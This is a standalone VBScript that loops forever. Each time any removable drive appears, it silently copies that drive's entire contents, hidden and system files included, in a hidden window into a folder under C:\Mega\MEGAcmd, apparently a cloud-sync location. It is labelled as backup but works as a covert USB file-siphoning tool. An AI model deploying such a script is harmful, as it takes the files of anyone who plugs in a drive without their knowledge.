Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject") ' Initialize the FileSystemObject

destinationRoot = "C:\Mega\MEGAcmd"

' Check if C:\Mega\MEGAcmd exists
If objFSO.FolderExists(destinationRoot) Then
    destination = destinationRoot & "\backup"

    ' Create the backup directory if it doesn't exist
    If Not objFSO.FolderExists(destination) Then
        objFSO.CreateFolder(destination)
    End If

    Do
        Set colItems = objWMIService.ExecQuery("Select * from Win32_Volume Where DriveType = 2")
        For Each objItem in colItems
            driveLetter = objItem.DriveLetter
            source = driveLetter & "\*.*"
            destinationDrive = destination & "\" & Left(driveLetter, 1) & "\"

            ' Create the destination directory if it doesn't exist
            If Not objFSO.FolderExists(destinationDrive) Then
                objFSO.CreateFolder(destinationDrive)
            End If

            ' Copy files from the USB flash drive to the destination
            objShell.Run "cmd /c xcopy """ & source & """ """ & destinationDrive & """ /E /C /H /R /Y", 0, True
        Next

        WScript.Sleep 5000 ' Wait for 5 seconds before checking for connected drives again
    Loop
Else
    WScript.Echo "C:\Mega\MEGAcmd directory not found."
End If
